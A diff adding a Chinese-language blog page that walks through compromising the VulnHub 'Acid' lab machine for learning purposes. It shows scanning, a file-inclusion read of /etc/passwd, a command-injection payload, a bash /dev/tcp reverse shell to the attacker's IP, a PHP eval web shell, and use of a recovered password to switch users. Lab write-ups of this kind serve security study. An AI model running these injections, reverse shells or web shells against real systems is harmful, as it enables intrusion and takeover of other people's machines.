@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>VulnHub_Acid靶机渗透测试学习 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub_Acid靶机渗透测试学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-06-17&nbsp;&nbsp;19:51:06</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次的实验的靶机是VulnHub上的Acid靶机， <a href="https://www.vulnhub.com/entry/acid-server,125/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/acid-server,125/</a>  。下载下来的文件是ova文件，导入vmware或是virtual box即可，要把网络模式调节为DHCP，默认好像是桥接模式。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>第一步先收集靶机信息，先确定靶机地址<code>nmap -sP 192.168.247.1/24</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Pictures$ nmap -sP 192.168.247.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 11:06 EDT</span><br><span class="line">Nmap scan report for 192.168.247.1</span><br><span class="line">Host is up (0.00086s latency).</span><br><span class="line">Nmap scan report for 192.168.247.2</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Nmap scan report for 192.168.247.210</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line">Nmap scan report for 192.168.247.212</span><br><span class="line">Host is up (0.00083s latency).</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.98 seconds</span><br></pre></td></tr></table></figure>
+
+<p><code>192.168.247.210</code>是攻击机kali的ip地址，所以靶机的ip地址就是<code>192.168.247.212</code>。</p>
+<p>然后用nmap看看目标主机上开启了什么服务，<code>nmap -p1-65525 -A 192.168.247.212 -oN /tmp/Acid.txt</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Pictures$ nmap -p1-65535 -A 192.168.247.212 -oN /tmp/Acid.txt</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 11:07 EDT</span><br><span class="line">Nmap scan report for 192.168.247.212</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Ubuntu)</span><br><span class="line">|_http-title: /Challenge</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.93 seconds</span><br></pre></td></tr></table></figure>
+
+<p>目标主机上开启了apache服务。</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>访问网页看看是什么东西：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/1.png" alt="1"></p>
+<p>发现标签页上写着<code>/Challenge</code>，说明网页存在子目录<code>http://192.168.247.212:33447/Challenge</code>。然后F12查看源码代码发现一串可疑的hex码<code>0x643239334c6d70775a773d3d</code>：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/2.png" alt="2"></p>
+<p>用burpsuite解码后发现是一串base64编码的字符串，再次解码，得到一个字符串<code>wow.jpg</code>，这是一张图片啊：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/3.png" alt="3"></p>
+<p>但是直接去访问<code>http://192.168.247.212:33447/Challenge/wow.jpg</code>或是<code>http://192.168.247.212:33447/wow.jpg</code>都是404 not found，说明这个<code>wow.jpg</code>并不在web root目录或是<code>Challenge</code>目录下。先用<code>dirb</code>快速地扫一下目录：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/4.png" alt="4"></p>
+<p>仅发现了两个目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;css</span><br><span class="line">&#x2F;images</span><br></pre></td></tr></table></figure>
+
+<p>这图片十分有可能在目录<code>images/</code>下，访问<code>http://192.168.247.212:33447/images/wow.jpg</code>，果然找到了图片：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/5.png" alt="5"></p>
+<p>我们把这张图片下载下来：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/wow.jpg" alt="wow"></p>
+<p>这张图片中肯定有点什么猫腻，直接cat命令查看一下：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/6.png" alt="6"></p>
+<p>得到一串序列：<code>37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34</code>。</p>
+<p>去掉其中地<code>:</code>就是<code>3761656530663664353838656439393035656533376631366137633631306434</code>，拿到burp的decode模块中解码，得到了一串md5值：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/7.png" alt="7"></p>
+<p>那只能拿去解码看看：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/8.png" alt="8"></p>
+<p>解码得到<code>63425</code>，这可能是什么登录密码。但是目前我们没有更多的信息。</p>
+<h3 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h3><p>我们用<code>Dirbuster</code>爆破一下网站目录和文件，用大一点的字典比较好：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/9.png" alt="9"></p>
+<p>看一下树形结构图会更清楚：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/10.png" alt="10"></p>
+<p>目前爆出的网页有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Challenge</span><br><span class="line">	-- index.php</span><br><span class="line">	-- inlucde.php</span><br><span class="line">	&#x2F; includes</span><br><span class="line">		-- logout.php</span><br><span class="line">		-- funtions.php</span><br><span class="line">	-- error.php</span><br><span class="line">	-- cake.php</span><br><span class="line">	-- hacked.php</span><br></pre></td></tr></table></figure>
+
+<p>依次访问，首先是<code>/Challenge/index.php</code>：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/11.png" alt="11"></p>
+<p>这是一个登录界面，猜测应该还有一个注册界面<code>register.php</code>，但是事实是没有。。。右键源码也没发现什么有价值的东西，继续看别的页面。</p>
+<p>然后是<code>/Challenge/include.php</code>页面，但是第一次访问它直接跳转到了<code>protected_page.php</code>，根据提示，是没有身份凭证，无法访问该页面，需要先login：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/13.png" alt="13"></p>
+<p>那先访问<code>/Challenge/cake.php</code>：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/14.png" alt="14"></p>
+<p>乍一看好像也没有什么特别的信息，但是看页面的标签，发现了一个新的目录<code>/Magic_Box</code>，是之前没有扫出来的。直接访问该目录是禁止的：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/23.png" alt="23"></p>
+<p>然后我随便尝试了下登录，奇怪的是，再去尝试访问<code>Challenge/hacked.php</code>已经有其他信息了，要求你输入一个id：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/19.png" alt="19"></p>
+<p>这里很自然的就想到是前面得到的md5解密后的<code>63425</code>，emmm…但是输入后什么用都没有…难道就是一个障眼法？</p>
+<p>接着访问<code>include.php</code>：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/12.png" alt="12"></p>
+<p>尝试提取<code>/etc/passwd</code>，提交后发现快速闪过该文件内容，所以用burp抓包观察一下：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/15.png" alt="15"></p>
+<p>所以<code>/Challenge/include.php</code>文件中存在一个文件包含漏洞。那接下来就依次读取一下每一个文件的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Challenge&#x2F;include.php?file&#x3D;index.php&amp;add&#x3D;Extract+File HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.247.212:33447</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.247.212:33447&#x2F;Challenge&#x2F;include.php</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: sec_session_id&#x3D;uck7i7csfrppq7gc0o2hf93uk0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>但是返回的结果全都是html页面源码，那么再用<code>Dirbuster</code>爆破一下目录<code>/Challenge/Magic_Box</code>，注意一定要将<code>Dir to start with</code>修改为<code>/Challenge/Magic_Box</code>，否则会从网站根目录<code>/</code>开始扫描：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/16.png" alt="16"></p>
+<p>扫出了两个新文件<code>/Challenge/Magic_Box/low.php</code>和<code>/Challenge/Magic_Box/command.php</code>：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/17.png" alt="17"></p>
+<p>访问<code>/Challenge/Magic_Box/low.php</code>没有回显，但是<code>command.php</code>要求我们输入一个ip：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/18.png" alt="18"></p>
+<p>这种题目之前的ctf见过很多了，就是命令执行。直接输入<code>127.0.0.1;ls</code>看什么效果：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/20.png" alt="20"></p>
+<p>执行了命令，确实存在命令执行漏洞。</p>
+<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>既然在<code>/Challenge/Magic_Box/command.php</code>中存在一个命令执行漏洞，那就可以通过反弹shell来控制目标主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.247.210&#x2F;23333 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/21.png" alt="21"></p>
+<p>然后希望向目标主机写入一个shell，方便后续链接蚁剑上传文件，发现只有<code>Challenge</code>目录有写权限<code>drw-rw-rwx</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ww-data@acid:/var/www/html$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 5 root root 4096 Aug  5  2015 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Aug  4  2015 ..</span><br><span class="line">drw-rw-rwx 8 root root 4096 Aug  6  2015 Challenge</span><br><span class="line">drwxrwxr-x 2 acid acid 4096 Aug  5  2015 css</span><br><span class="line">drwxrwxr-x 2 acid acid 4096 Aug  5  2015 images</span><br><span class="line">-rw-r--r-- 1 acid acid  899 Aug  5  2015 index.html</span><br><span class="line">www-data@acid:/var/www/html$ cd Challenge</span><br><span class="line">cd Challenge</span><br><span class="line">www-data@acid:/var/www/html/Challenge$ echo '&lt;?php eval($_GET[1]);?&gt;' &gt; shell.php</span><br><span class="line">&lt;/Challenge$ echo '&lt;?php eval($_GET[1]);?&gt;' &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>然后连接上蚁剑后是这样的，有点懵…什么情况？</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/22.png" alt="22"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>本来我的想法是根据当前的内核版本，看看有没有相关漏洞，进行一个本地提权。但是似乎当前的shell提供的命令很少，连gcc编译都无法进行。联想到前面利用<code>/Challenge/include.php</code>文件包含漏洞获得的<code>/etc/passwd</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:105:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:106:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:107:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:105:112::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:106:113::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false</span><br><span class="line">ntp:x:108:117::&#x2F;home&#x2F;ntp:&#x2F;bin&#x2F;false</span><br><span class="line">whoopsie:x:109:118::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">acid:x:1000:1000:acid,,,:&#x2F;home&#x2F;acid:&#x2F;bin&#x2F;bash</span><br><span class="line">mysql:x:111:126:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">saman:x:1001:1001:,,,:&#x2F;home&#x2F;saman:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>最后一个字段是当用户登录系统后被分配的shell，可以看到只有3个用户登录后是标准shell，分别是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">acid:x:1000:1000:acid,,,:&#x2F;home&#x2F;acid:&#x2F;bin&#x2F;bash</span><br><span class="line">saman:x:1001:1001:,,,:&#x2F;home&#x2F;saman:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>其余的用户对应的shell是<code>/bin/false</code>和<code>/usr/sbin/nologin</code>。</p>
+<blockquote>
+<p><strong>/bin/false</strong> :  最严格的禁止login选项，一切服务都不能用。将用户的shell设置为/bin/false,用户会无法登录,并且不会有任何提示 </p>
+<p><strong>/usr/sbin/nologin</strong> :  只是不允许login系统，即使给了密码也不行，但是可以使用主机上的一些服务。</p>
+</blockquote>
+<p>但是因为切换到其他用户需要密码，搜索一下与该用户相关的文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user acid 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><code>2&gt;/dev/null</code>表示不输出标准错误。linux系统预留了三个文件描述符：0，1和2，它们的意义为：</p>
+<blockquote>
+<p>0 : 标准输入（stdin）</p>
+<p>1 : 标准输出（stdout）</p>
+<p>2 : 标准错误（stderr）</p>
+</blockquote>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/24.png" alt="24"></p>
+<p>一个可以的<code>pcapng</code>流量包，将其下载到攻击机kali进行分析：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@acid:/var/www/html/Challenge/Magic_Box$ scp /sbin/raw_vs_isi/hint.pcapng 192.168.247.210:/home/kali/Downloads</span><br><span class="line">&lt;/sbin/raw_vs_isi/hint.pcapng 192.168.247.210:/home/kali/Downloads           </span><br><span class="line">ssh: connect to host 192.168.247.210 port 22: Connection refused</span><br><span class="line">lost connection</span><br></pre></td></tr></table></figure>
+
+<p><code>scp</code>命令用不了，应该是<code>ssh</code>服务没有安装好。因为python内置了一个简单的http服务，那就用python开一个http服务。进入需要分享的文件所在目录，执行下面一行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<p>访问目标主机的80端口就能下载该文件。wireshark打开后，跟踪tcp流：</p>
+<p><img src="/2020/06/17/VulnHub_Acid/imgs/25.png" alt="25"></p>
+<p>发现<code>saman</code>用户的密码<code>1337hax0r</code>。</p>
+<h3 id="获取标准shell"><a href="#获取标准shell" class="headerlink" title="获取标准shell"></a>获取标准shell</h3><p>然后<code>su</code>到<code>saman</code>用户，但是因为当前的shell权限不足，运行失败：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@acid:/var/www/html/Challenge/Magic_Box$ su saman</span><br><span class="line">su saman</span><br><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>
+
+<p>所以首先要获得一个标准shell。</p>
+<p>这表明，必须先获得一个标准shell。这里可以借用python的<code>pty</code>模块，<code>pty</code>模块允许派生一个<code>psuedo-terminal</code>，它可以欺骗像<code>su</code>这样的命令，使其认为它们是在一个合适的终端中被执行的。要升级shell，只需要运行以下命令：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以获得一个标准shell，<code>su</code>命令已经可以正常运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@acid:/var/www/html/Challenge/Magic_Box$ python -c 'import pty; pty.spawn("/bin/bash")'</span><br><span class="line">&lt;/Challenge/Magic_Box$ python -c 'import pty; pty.spawn("/bin/bash")'        </span><br><span class="line">www-data@acid:/var/www/html/Challenge/Magic_Box$ su saman</span><br><span class="line">su saman</span><br><span class="line">Password: 1337hax0r</span><br><span class="line"></span><br><span class="line">saman@acid:/var/www/html/Challenge/Magic_Box$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(saman) gid=1001(saman) groups=1001(saman)</span><br></pre></td></tr></table></figure>
+
+<p>到目前为止，已经成功获得了目标主机的控制。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/17/VulnHub_Acid/">https://bantttian.github.io/2020/06/17/VulnHub_Acid/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/12/vulnhub_Billu/">VulnHub BiLLu靶机渗透测试学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
